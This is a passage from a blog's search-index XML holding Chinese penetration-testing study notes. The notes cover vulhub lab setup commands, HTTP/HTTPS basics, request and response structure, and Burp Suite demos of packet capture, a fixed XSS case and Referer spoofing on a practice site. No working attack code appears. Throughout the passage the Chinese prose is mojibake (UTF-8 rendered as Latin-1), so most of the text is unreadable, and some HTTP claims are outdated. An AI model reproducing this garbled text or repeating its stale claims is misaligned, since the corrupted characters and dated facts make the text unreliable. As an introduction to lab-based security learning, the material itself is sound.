id="åŸºäºä¸­é—´ä»¶çš„å®‰å…¨æ¼æ´"><a href="#åŸºäºä¸­é—´ä»¶çš„å®‰å…¨æ¼æ´" class="headerlink" title="åŸºäºä¸­é—´ä»¶çš„å®‰å…¨æ¼æ´"></a>åŸºäºä¸­é—´ä»¶çš„å®‰å…¨æ¼æ´</h4><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211040092.png" alt="image-20210921104020027" style="zoom:80%;" /><h4 id="ç›¸å…³ç»ƒä¹ å¹³å°"><a href="#ç›¸å…³ç»ƒä¹ å¹³å°" class="headerlink" title="ç›¸å…³ç»ƒä¹ å¹³å°"></a>ç›¸å…³ç»ƒä¹ å¹³å°</h4><ul><li><a href="http://www.vulhub.org/">www.vulhub.org</a></li><li><a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a></li></ul><h4 id="vulhubé¶åœº"><a href="#vulhubé¶åœº" class="headerlink" title="vulhubé¶åœº"></a>vulhubé¶åœº</h4><p>å¼€å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose build</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure><p>å…³é—­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose down</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> åŸºç¡€å…¥é—¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>02åŸºç¡€å…¥é—¨--æ•°æ®åŒ…æ‹“å±•</title>
      <link href="/2021/09/12/02%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/"/>
      <url>/2021/09/12/02%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="ç½‘ç«™è§£æå¯¹åº”"><a href="#ç½‘ç«™è§£æå¯¹åº”" class="headerlink" title="ç½‘ç«™è§£æå¯¹åº”"></a>ç½‘ç«™è§£æå¯¹åº”</h3><h4 id="ç®€è¦ç½‘ç«™æ­å»ºè¿‡ç¨‹"><a href="#ç®€è¦ç½‘ç«™æ­å»ºè¿‡ç¨‹" class="headerlink" title="ç®€è¦ç½‘ç«™æ­å»ºè¿‡ç¨‹"></a>ç®€è¦ç½‘ç«™æ­å»ºè¿‡ç¨‹</h4><p><a href="https://www.cnblogs.com/GodSince/p/12010184.html">https://www.cnblogs.com/GodSince/p/12010184.html</a></p><h4 id="æ¶‰åŠåˆ°çš„æ”»å‡»å±‚é¢ï¼Ÿ"><a href="#æ¶‰åŠåˆ°çš„æ”»å‡»å±‚é¢ï¼Ÿ" class="headerlink" title="æ¶‰åŠåˆ°çš„æ”»å‡»å±‚é¢ï¼Ÿ"></a>æ¶‰åŠåˆ°çš„æ”»å‡»å±‚é¢ï¼Ÿ</h4><p>æºç ï¼Œæ­å»ºå¹³å°ï¼Œç³»ç»Ÿï¼Œç½‘ç»œå±‚ç­‰</p><h4 id="æ¶‰åŠåˆ°çš„å®‰å…¨é—®é¢˜ï¼Ÿ"><a href="#æ¶‰åŠåˆ°çš„å®‰å…¨é—®é¢˜ï¼Ÿ" class="headerlink" title="æ¶‰åŠåˆ°çš„å®‰å…¨é—®é¢˜ï¼Ÿ"></a>æ¶‰åŠåˆ°çš„å®‰å…¨é—®é¢˜ï¼Ÿ</h4><p>ç›®å½•ï¼Œæ•æ„Ÿæ–‡ä»¶ï¼Œå¼±å£ä»¤ï¼ŒIP åŠåŸŸåç­‰</p><h3 id="HTTP-Sæ•°æ®åŒ…"><a href="#HTTP-Sæ•°æ®åŒ…" class="headerlink" title="HTTP/Sæ•°æ®åŒ…"></a>HTTP/Sæ•°æ®åŒ…</h3><p>Requestè¯·æ±‚æ•°æ®åŒ…</p><p>Responseè¿”å›æ•°æ®åŒ…</p><p><img src="https://p.pstatp.com/origin/pgc-image/6531c95e858442ef8b03c11046995819"></p><p>Requestè¯·æ±‚æ•°æ®åŒ…</p><p>Proxyä»£ç†æœåŠ¡å™¨ </p><p>Responseè¿”å›æ•°æ®åŒ…</p><p><img src="https://p.pstatp.com/origin/pgc-image/99fae3708d554786a1045757054e7c35"></p><h3 id="å…³äºHTTPå’ŒHTTPS"><a href="#å…³äºHTTPå’ŒHTTPS" class="headerlink" title="å…³äºHTTPå’ŒHTTPS"></a>å…³äºHTTPå’ŒHTTPS</h3><p>HTTPï¼ˆHyperText Transfer Protocolï¼šè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼‰æ˜¯ä¸€ç§ç”¨äºåˆ†å¸ƒå¼ã€åä½œå¼å’Œè¶…åª’ä½“ä¿¡æ¯ç³»ç»Ÿçš„åº”ç”¨å±‚åè®®ã€‚ ç®€å•æ¥è¯´å°±æ˜¯ä¸€ç§å‘å¸ƒå’Œæ¥æ”¶ HTML é¡µé¢çš„æ–¹æ³•ï¼Œè¢«ç”¨äºåœ¨ Web æµè§ˆå™¨å’Œç½‘ç«™æœåŠ¡å™¨ä¹‹é—´ä¼ é€’ä¿¡æ¯ã€‚</p><p>HTTP é»˜è®¤å·¥ä½œåœ¨ TCP åè®® 80 ç«¯å£ï¼Œç”¨æˆ·è®¿é—®ç½‘ç«™ http:// æ‰“å¤´çš„éƒ½æ˜¯æ ‡å‡† HTTP æœåŠ¡ã€‚</p><p>HTTP åè®®ä»¥æ˜æ–‡æ–¹å¼å‘é€å†…å®¹ï¼Œä¸æä¾›ä»»ä½•æ–¹å¼çš„æ•°æ®åŠ å¯†ï¼Œå¦‚æœæ”»å‡»è€…æˆªå–äº†Webæµè§ˆå™¨å’Œç½‘ç«™æœåŠ¡å™¨ä¹‹é—´çš„ä¼ è¾“æŠ¥æ–‡ï¼Œå°±å¯ä»¥ç›´æ¥è¯»æ‡‚å…¶ä¸­çš„ä¿¡æ¯ï¼Œå› æ­¤ï¼ŒHTTPåè®®ä¸é€‚åˆä¼ è¾“ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚ï¼šä¿¡ç”¨å¡å·ã€å¯†ç ç­‰æ”¯ä»˜ä¿¡æ¯ã€‚</p><p>HTTPSï¼ˆHypertext Transfer Protocol Secureï¼šè¶…æ–‡æœ¬ä¼ è¾“å®‰å…¨åè®®ï¼‰æ˜¯ä¸€ç§é€è¿‡è®¡ç®—æœºç½‘ç»œè¿›è¡Œå®‰å…¨é€šä¿¡çš„ä¼ è¾“åè®®ã€‚HTTPS ç»ç”± HTTP è¿›è¡Œé€šä¿¡ï¼Œä½†åˆ©ç”¨ SSL/TLS æ¥åŠ å¯†æ•°æ®åŒ…ã€‚HTTPS å¼€å‘çš„ä¸»è¦ç›®çš„ï¼Œæ˜¯æä¾›å¯¹ç½‘ç«™æœåŠ¡å™¨çš„èº«ä»½è®¤è¯ï¼Œä¿æŠ¤äº¤æ¢æ•°æ®çš„éšç§ä¸å®Œæ•´æ€§ã€‚</p><p>HTTPS é»˜è®¤å·¥ä½œåœ¨ TCP åè®®443ç«¯å£ï¼Œå®ƒçš„å·¥ä½œæµç¨‹ä¸€èˆ¬å¦‚ä»¥ä¸‹æ–¹å¼ï¼š</p><ul><li>1ã€TCP ä¸‰æ¬¡åŒæ­¥æ¡æ‰‹</li><li>2ã€å®¢æˆ·ç«¯éªŒè¯æœåŠ¡å™¨æ•°å­—è¯ä¹¦</li><li>3ã€DH ç®—æ³•åå•†å¯¹ç§°åŠ å¯†ç®—æ³•çš„å¯†é’¥ã€hash ç®—æ³•çš„å¯†é’¥</li><li>4ã€SSL å®‰å…¨åŠ å¯†éš§é“åå•†å®Œæˆ</li><li>5ã€ç½‘é¡µä»¥åŠ å¯†çš„æ–¹å¼ä¼ è¾“ï¼Œç”¨åå•†çš„å¯¹ç§°åŠ å¯†ç®—æ³•å’Œå¯†é’¥åŠ å¯†ï¼Œä¿è¯æ•°æ®æœºå¯†æ€§ï¼›ç”¨åå•†çš„hashç®—æ³•è¿›è¡Œæ•°æ®å®Œæ•´æ€§ä¿æŠ¤ï¼Œä¿è¯æ•°æ®ä¸è¢«ç¯¡æ”¹ã€‚</li></ul><p>HTTPå’ŒHTTPSçš„ç®€è¦é€šä¿¡è¿‡ç¨‹</p><p>HTTPï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å»ºç«‹è¿æ¥â€”â€”&gt;å‘é€è¯·æ±‚æ•°æ®åŒ…â€”â€”&gt;è¿”å›å“åº”æ•°æ®åŒ…â€”â€”&gt;å…³é—­è¿æ¥</span><br><span class="line">1.æµè§ˆå™¨å»ºç«‹ä¸ web æœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥</span><br><span class="line">2.æµè§ˆå™¨å°†è¯·æ±‚æ•°æ®æ‰“åŒ…ï¼ˆç”Ÿæˆè¯·æ±‚æ•°æ®åŒ…ï¼‰å¹¶å‘é€åˆ° web æœåŠ¡å™¨</span><br><span class="line">3.web æœåŠ¡å™¨å°†å¤„ç†ç»“æœæ‰“åŒ…ï¼ˆç”Ÿæˆå“åº”æ•°æ®åŒ…ï¼‰å¹¶å‘é€ç»™æµè§ˆå™¨</span><br><span class="line">4.web æœåŠ¡å™¨å…³é—­è¿æ¥</span><br></pre></td></tr></table></figure><p>HTTPSï¼š</p><img src="https://p.pstatp.com/origin/pgc-image/3a7a4f0e9fc94b1aae716f713fbe8184" style="zoom:67%;" /><h3 id="HTTP-HTTPS-å…·ä½“åŒºåˆ«ï¼Ÿ"><a href="#HTTP-HTTPS-å…·ä½“åŒºåˆ«ï¼Ÿ" class="headerlink" title="HTTP/HTTPS å…·ä½“åŒºåˆ«ï¼Ÿ"></a>HTTP/HTTPS å…·ä½“åŒºåˆ«ï¼Ÿ</h3><ul><li>HTTP æ˜æ–‡ä¼ è¾“ï¼Œæ•°æ®éƒ½æ˜¯æœªåŠ å¯†çš„ï¼Œå®‰å…¨æ€§è¾ƒå·®ï¼ŒHTTPSï¼ˆSSL+HTTPï¼‰ æ•°æ®ä¼ è¾“è¿‡ç¨‹æ˜¯åŠ å¯†çš„ï¼Œå®‰å…¨æ€§è¾ƒå¥½ã€‚</li><li>ä½¿ç”¨ HTTPS åè®®éœ€è¦åˆ° CAï¼ˆCertificate Authorityï¼Œæ•°å­—è¯ä¹¦è®¤è¯æœºæ„ï¼‰ ç”³è¯·è¯ä¹¦ï¼Œä¸€èˆ¬å…è´¹è¯ä¹¦è¾ƒå°‘ï¼Œå› è€Œéœ€è¦ä¸€å®šè´¹ç”¨ã€‚è¯ä¹¦é¢å‘æœºæ„å¦‚ï¼šSymantecã€Comodoã€GoDaddy å’Œ GlobalSign ç­‰ã€‚</li><li>HTTP é¡µé¢å“åº”é€Ÿåº¦æ¯” HTTPS å¿«ï¼Œä¸»è¦æ˜¯å› ä¸º HTTP ä½¿ç”¨ TCP ä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿æ¥ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éœ€è¦äº¤æ¢ 3 ä¸ªåŒ…ï¼Œè€Œ HTTPSé™¤äº† TCP çš„ä¸‰ä¸ªåŒ…ï¼Œè¿˜è¦åŠ ä¸Š ssl æ¡æ‰‹éœ€è¦çš„ 9 ä¸ªåŒ…ï¼Œæ‰€ä»¥ä¸€å…±æ˜¯ 12 ä¸ªåŒ…ã€‚</li><li>http å’Œ https ä½¿ç”¨çš„æ˜¯å®Œå…¨ä¸åŒçš„è¿æ¥æ–¹å¼ï¼Œç”¨çš„ç«¯å£ä¹Ÿä¸ä¸€æ ·ï¼Œå‰è€…æ˜¯ 80ï¼Œåè€…æ˜¯ 443ã€‚</li><li>HTTPS å…¶å®å°±æ˜¯å»ºæ„åœ¨ SSL/TLS ä¹‹ä¸Šçš„ HTTP åè®®ï¼Œæ‰€ä»¥ï¼Œè¦æ¯”è¾ƒ HTTPS æ¯” HTTP è¦æ›´è€—è´¹æœåŠ¡å™¨èµ„æºã€‚</li></ul><h3 id="Request-è¯·æ±‚æ•°æ®åŒ…æ•°æ®æ ¼å¼"><a href="#Request-è¯·æ±‚æ•°æ®åŒ…æ•°æ®æ ¼å¼" class="headerlink" title="Request è¯·æ±‚æ•°æ®åŒ…æ•°æ®æ ¼å¼"></a>Request è¯·æ±‚æ•°æ®åŒ…æ•°æ®æ ¼å¼</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¯·æ±‚è¡Œï¼šè¯·æ±‚ç±»å‹/è¯·æ±‚èµ„æºè·¯å¾„ã€åè®®çš„ç‰ˆæœ¬å’Œç±»å‹</span><br><span class="line">è¯·æ±‚å¤´ï¼šä¸€äº›é”®å€¼å¯¹ï¼Œæµè§ˆå™¨ä¸ web æœåŠ¡å™¨ä¹‹é—´éƒ½å¯ä»¥å‘é€ï¼Œç‰¹å®šçš„æŸç§å«ä¹‰</span><br><span class="line">ç©ºè¡Œï¼šè¯·æ±‚å¤´ä¸è¯·æ±‚ä½“ä¹‹é—´ç”¨ä¸€ä¸ªç©ºè¡Œéš”å¼€ï¼›</span><br><span class="line">è¯·æ±‚ä½“ï¼šè¦å‘é€çš„æ•°æ®(ä¸€èˆ¬ post æäº¤ä¼šä½¿ç”¨)ï¼›ä¾‹ï¼šuser=123&amp;pass=123</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼šRequest Headers</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /adduser HTTP/1.1</span><br><span class="line">Host: localhost:8030</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 16</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Origin: chrome-extension://fdmmgilgnpjigdojojpjoooidkmcomcm</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)</span><br><span class="line">Chrome/66.0.3359.181 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure><h4 id="è¯·æ±‚è¡Œ"><a href="#è¯·æ±‚è¡Œ" class="headerlink" title="è¯·æ±‚è¡Œ"></a>è¯·æ±‚è¡Œ</h4><p>è¯·æ±‚è¡Œç”±ä¸‰ä¸ªæ ‡è®°ç»„æˆï¼šè¯·æ±‚æ–¹æ³•ã€è¯·æ±‚ URL å’Œ HTTP ç‰ˆæœ¬ï¼Œå®ƒä»¬ç”¨ç©ºæ ¼åˆ†äº«ã€‚</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br></pre></td></tr></table></figure><p>HTTP è§„åˆ’å®šä¹‰äº† 8 ç§å¯èƒ½çš„è¯·æ±‚æ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GETï¼šæ£€ç´¢ URL ä¸­æ ‡è¯†èµ„æºçš„ä¸€ä¸ªç®€å•è¯·æ±‚</span><br><span class="line">HEADï¼šä¸ GET æ–¹æ³•ç›¸åŒï¼ŒæœåŠ¡å™¨åªè¿”å›çŠ¶æ€è¡Œå’Œå¤´æ ‡ï¼Œå¹¶ä¸è¿”å›è¯·æ±‚æ–‡æ¡£</span><br><span class="line">POSTï¼šæœåŠ¡å™¨æ¥å—è¢«å†™å…¥å®¢æˆ·ç«¯è¾“å‡ºæµä¸­çš„æ•°æ®çš„è¯·æ±‚</span><br><span class="line">PUTï¼šæœåŠ¡å™¨ä¿å­˜è¯·æ±‚æ•°æ®ä½œä¸ºæŒ‡å®š URL æ–°å†…å®¹çš„è¯·æ±‚</span><br><span class="line">DELETEï¼šæœåŠ¡å™¨åˆ é™¤ URL ä¸­å‘½ä»¤çš„èµ„æºçš„è¯·æ±‚</span><br><span class="line">OPTIONSï¼šå…³äºæœåŠ¡å™¨æ”¯æŒçš„è¯·æ±‚æ–¹æ³•ä¿¡æ¯çš„è¯·æ±‚</span><br><span class="line">TRACEï¼šweb æœåŠ¡å™¨åé¦ˆ Http è¯·æ±‚å’Œå…¶å¤´æ ‡çš„è¯·æ±‚</span><br><span class="line">CONNECT ï¼šå·²æ–‡æ¡£åŒ–ï¼Œä½†å½“å‰æœªå®ç°çš„ä¸€ä¸ªæ–¹æ³•ï¼Œé¢„ç•™åšéš§é“å¤„ç†</span><br></pre></td></tr></table></figure><h4 id="è¯·æ±‚å¤´"><a href="#è¯·æ±‚å¤´" class="headerlink" title="è¯·æ±‚å¤´"></a>è¯·æ±‚å¤´</h4><p>ç”±å…³é”®å­—/å€¼å¯¹ç»„æˆï¼Œæ¯è¡Œä¸€å¯¹ï¼Œå…³é”®å­—å’Œå€¼ç”¨å†’å·åˆ†äº«ã€‚è¯·æ±‚å¤´æ ‡é€šçŸ¥æœåŠ¡å™¨è…¾äºå®¢æˆ·ç«¯çš„åŠŸèƒ½å’Œæ ‡è¯†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HOST: ä¸»æœºæˆ–åŸŸååœ°å€</span><br><span class="line">Acceptï¼šæŒ‡æµè§ˆå™¨æˆ–å…¶ä»–å®¢æˆ·å¯ä»¥æ¥çˆ±çš„ MIME æ–‡ä»¶æ ¼å¼ã€‚Servlet å¯ä»¥æ ¹æ®å®ƒåˆ¤æ–­å¹¶è¿”å›é€‚å½“çš„æ–‡ä»¶æ ¼å¼ã€‚</span><br><span class="line">User-Agentï¼šæ˜¯å®¢æˆ·æµè§ˆå™¨åç§°</span><br><span class="line">Hostï¼šå¯¹åº”ç½‘å€ URL ä¸­çš„ Web åç§°å’Œç«¯å£å·ã€‚</span><br><span class="line">Accept-Langeuageï¼šæŒ‡å‡ºæµè§ˆå™¨å¯ä»¥æ¥å—çš„è¯­è¨€ç§ç±»ï¼Œå¦‚ en æˆ– en-usï¼ŒæŒ‡è‹±è¯­ã€‚</span><br><span class="line">connectionï¼šç”¨æ¥å‘Šè¯‰æœåŠ¡å™¨æ˜¯å¦å¯ä»¥ç»´æŒå›ºå®šçš„ HTTP è¿æ¥ã€‚http æ˜¯æ— è¿æ¥çš„ï¼ŒHTTP/1.1 ä½¿ç”¨ Keep-Alive</span><br><span class="line">ä¸ºé»˜è®¤å€¼ï¼Œè¿™æ ·ï¼Œå½“æµè§ˆå™¨éœ€è¦å¤šä¸ªæ–‡ä»¶æ—¶(æ¯”å¦‚ä¸€ä¸ª HTML æ–‡ä»¶å’Œç›¸å…³çš„å›¾å½¢æ–‡ä»¶)ï¼Œä¸éœ€è¦æ¯æ¬¡éƒ½å»ºç«‹è¿æ¥</span><br><span class="line">Cookieï¼šæµè§ˆå™¨ç”¨è¿™ä¸ªå±æ€§å‘æœåŠ¡å™¨å‘é€ Cookieã€‚Cookie æ˜¯åœ¨æµè§ˆå™¨ä¸­å¯„å­˜çš„å°å‹æ•°æ®ä½“ï¼Œå®ƒå¯ä»¥è®°è½½å’ŒæœåŠ¡å™¨ç›¸å…³çš„ç”¨æˆ·ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥å®ç°ä¼šè¯åŠŸèƒ½ã€‚</span><br><span class="line">Refererï¼šè¡¨æ˜äº§ç”Ÿè¯·æ±‚çš„ç½‘é¡µURLã€‚å¦‚æ¯”ä»ç½‘é¡µ/icconcept/index.jspä¸­ç‚¹å‡»ä¸€ä¸ªé“¾æ¥åˆ°ç½‘é¡µ</span><br><span class="line">/icwork/search ï¼Œ åœ¨ å‘ æœ åŠ¡ å™¨ å‘ é€ çš„ GET/icwork/search ä¸­ çš„ è¯· æ±‚ ä¸­ ï¼Œ Referer æ˜¯</span><br><span class="line">http://hostname:8080/icconcept/index.jspã€‚è¿™ä¸ªå±æ€§å¯ä»¥ç”¨æ¥è·Ÿè¸ª Web è¯·æ±‚æ˜¯ä»ä»€ä¹ˆç½‘ç«™æ¥çš„ã€‚</span><br><span class="line">Content-Typeï¼šç”¨æ¥è¡¨å request çš„å†…å®¹ç±»å‹ã€‚å¯ä»¥ç”¨ HttpServletRequest çš„ getContentType()æ–¹æ³•å–å¾—ã€‚</span><br><span class="line">Accept-Charsetï¼šæŒ‡å‡ºæµè§ˆå™¨å¯ä»¥æ¥å—çš„å­—ç¬¦ç¼–ç ã€‚è‹±æ–‡æµè§ˆå™¨çš„é»˜è®¤å€¼æ˜¯ ISO-8859-1.</span><br><span class="line">Accept-Encodingï¼šæŒ‡å‡ºæµè§ˆå™¨å¯ä»¥æ¥å—çš„ç¼–ç æ–¹å¼ã€‚ç¼–ç æ–¹å¼ä¸åŒäºæ–‡ä»¶æ ¼å¼ï¼Œå®ƒæ˜¯ä¸ºäº†å‹ç¼©æ–‡ä»¶å¹¶åŠ é€Ÿæ–‡ä»¶ä¼ é€’é€Ÿåº¦ã€‚æµè§ˆå™¨åœ¨æ¥æ”¶åˆ° Web å“åº”ä¹‹åå…ˆè§£ç ï¼Œç„¶åå†æ£€æŸ¥æ–‡ä»¶æ ¼å¼ã€‚</span><br></pre></td></tr></table></figure><h4 id="ç©ºè¡Œ"><a href="#ç©ºè¡Œ" class="headerlink" title="ç©ºè¡Œ"></a>ç©ºè¡Œ</h4><p>æœ€åä¸€ä¸ªè¯·æ±‚å¤´æ ‡ä¹‹åæ˜¯ç©ºè¡Œï¼Œå‘é€å›è½¦ç¬¦å’Œé€€è¡Œï¼Œé€šçŸ¥æœåŠ¡å™¨ä»¥ä¸‹ä¸å†æœ‰å¤´æ ‡ã€‚</p><h4 id="è¯·æ±‚æ•°æ®"><a href="#è¯·æ±‚æ•°æ®" class="headerlink" title="è¯·æ±‚æ•°æ®"></a>è¯·æ±‚æ•°æ®</h4><p>ä½¿ç”¨ POST ä¼ é€ï¼Œæœ€å¸¸ä½¿ç”¨çš„æ˜¯ Content-Type å’Œ Content-Length å¤´æ ‡ã€‚</p><h3 id="Response-è¿”å›æ•°æ®åŒ…æ•°æ®æ ¼å¼"><a href="#Response-è¿”å›æ•°æ®åŒ…æ•°æ®æ ¼å¼" class="headerlink" title="Response è¿”å›æ•°æ®åŒ…æ•°æ®æ ¼å¼"></a>Response è¿”å›æ•°æ®åŒ…æ•°æ®æ ¼å¼</h3><p>ä¸€ä¸ªå“åº”ç”±å››ä¸ªéƒ¨åˆ†ç»„æˆï¼›çŠ¶æ€è¡Œã€å“åº”å¤´æ ‡ã€ç©ºè¡Œã€å“åº”æ•°æ®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">çŠ¶æ€è¡Œï¼šåè®®ç‰ˆæœ¬ã€æ•°å­—å½¢å¼çš„çŠ¶æ€ä»£ç å’ŒçŠ¶æ€æè¿°ï¼Œä¸ªå…ƒç´ ä¹‹é—´ä»¥ç©ºæ ¼åˆ†éš”</span><br><span class="line">å“åº”å¤´æ ‡ï¼šåŒ…å«æœåŠ¡å™¨ç±»å‹ã€æ—¥æœŸã€é•¿åº¦ã€å†…å®¹ç±»å‹ç­‰</span><br><span class="line">ç©ºè¡Œï¼šå“åº”å¤´ä¸å“åº”ä½“ä¹‹é—´ç”¨ç©ºè¡Œéš”å¼€</span><br><span class="line">å“åº”æ•°æ®ï¼šæµè§ˆå™¨ä¼šå°†å®ä½“å†…å®¹ä¸­çš„æ•°æ®å–å‡ºæ¥ï¼Œç”Ÿæˆç›¸åº”çš„é¡µé¢</span><br></pre></td></tr></table></figure><h4 id="HTTP-å“åº”ç ï¼š"><a href="#HTTP-å“åº”ç ï¼š" class="headerlink" title="HTTP å“åº”ç ï¼š"></a>HTTP å“åº”ç ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1xxï¼šä¿¡æ¯ï¼Œè¯·æ±‚æ”¶åˆ°ï¼Œç»§ç»­å¤„ç†</span><br><span class="line">2xxï¼šæˆåŠŸï¼Œè¡Œä¸ºè¢«æˆåŠŸåœ°æ¥å—ã€ç†è§£å’Œé‡‡çº³</span><br><span class="line">3xxï¼šé‡å®šå‘ï¼Œä¸ºäº†å®Œæˆè¯·æ±‚ï¼Œå¿…é¡»è¿›ä¸€æ­¥æ‰§è¡Œçš„åŠ¨ä½œ</span><br><span class="line">4xxï¼šå®¢æˆ·ç«¯é”™è¯¯</span><br><span class="line">5xxï¼šæœåŠ¡å™¨é”™è¯¯</span><br></pre></td></tr></table></figure><h4 id="å“åº”å¤´æ ‡"><a href="#å“åº”å¤´æ ‡" class="headerlink" title="å“åº”å¤´æ ‡"></a>å“åº”å¤´æ ‡</h4><p>æƒ³è¯·æ±‚å¤´æ ‡ä¸€æ ·ï¼Œä»–ä»¬æŒ‡å‡ºæœåŠ¡å™¨çš„åŠŸèƒ½ï¼Œæ ‡è¯†å‡ºå“åº”æ•°æ®çš„ç»†èŠ‚</p><h4 id="ç©ºè¡Œ-1"><a href="#ç©ºè¡Œ-1" class="headerlink" title="ç©ºè¡Œ"></a>ç©ºè¡Œ</h4><p>æœ€åä¸€ä¸ªå“åº”å¤´æ ‡ä¹‹åæ˜¯ä¸€ä¸ªç©ºè¡Œï¼Œå‘é€å›è½¦é—´å’Œé€€è¡Œï¼Œè¡¨æ˜æœåŠ¡å™¨ä»¥ä¸‹ä¸å†æœ‰å¤´æ ‡</p><h4 id="å“åº”æ•°æ®"><a href="#å“åº”æ•°æ®" class="headerlink" title="å“åº”æ•°æ®"></a>å“åº”æ•°æ®</h4><p>HTMLæ–‡æ¡£å’Œå›¾åƒç­‰ï¼Œä¹Ÿæ˜¯HTMLæœ¬èº«</p><h3 id="æ¼”ç¤ºæ¡ˆä¾‹"><a href="#æ¼”ç¤ºæ¡ˆä¾‹" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹"></a>æ¼”ç¤ºæ¡ˆä¾‹</h3><h4 id="Burp-Suite-æŠ“åŒ…"><a href="#Burp-Suite-æŠ“åŒ…" class="headerlink" title="Burp Suite æŠ“åŒ…"></a>Burp Suite æŠ“åŒ…</h4><p><img src="https://p.pstatp.com/origin/pgc-image/8642e53d083142d1bcaec7ef42f13b84" style="zoom:67%;" /><img src="https://p.pstatp.com/origin/pgc-image/e4d8a13f5b5748529bf9a24e35525e10"></p><p><img src="https://p.pstatp.com/origin/pgc-image/e4d8a13f5b5748529bf9a24e35525e10"></p><img src="https://p.pstatp.com/origin/pgc-image/ea4d2e62b483443d9167a38473bd1189" style="zoom:67%;" /><h4 id="ç¬¬ä¸‰æ–¹æ£€æµ‹ä¿®æ”¹å®ç°XSSæ”»å‡»"><a href="#ç¬¬ä¸‰æ–¹æ£€æµ‹ä¿®æ”¹å®ç°XSSæ”»å‡»" class="headerlink" title="ç¬¬ä¸‰æ–¹æ£€æµ‹ä¿®æ”¹å®ç°XSSæ”»å‡»"></a>ç¬¬ä¸‰æ–¹æ£€æµ‹ä¿®æ”¹å®ç°XSSæ”»å‡»</h4><p>å·²ç»è¢«ä¿®å¤äº†ã€‚</p><p><img src="https://p.pstatp.com/origin/pgc-image/f65d99f08f774578a0330c88d1e8ce67"></p><h4 id="æ¥æºé¡µä¼ªé€ "><a href="#æ¥æºé¡µä¼ªé€ " class="headerlink" title="æ¥æºé¡µä¼ªé€ "></a>æ¥æºé¡µä¼ªé€ </h4><p><a href="https://www.mozhe.cn/bug/detail/56">https://www.mozhe.cn/bug/detail/56</a></p><p><img src="https://p.pstatp.com/origin/pgc-image/a6670122175c49cd93232959fe31949b"></p><p>åœ¨burpä¸Šè¿›è¡ŒæŠ“åŒ…è¿›è¡Œæ¥æºé¡µå—ä¿®æ”¹</p><p>ä¿®æ”¹Refererå‚æ•°ï¼Œåœ°å€æ¥æº</p><p><img src="https://p.pstatp.com/origin/pgc-image/0922534728924315a0a3fa06f7095bfb"></p><p><img src="https://p.pstatp.com/origin/pgc-image/9d21d2f9d38e465295a83947c4488e39"></p><h4 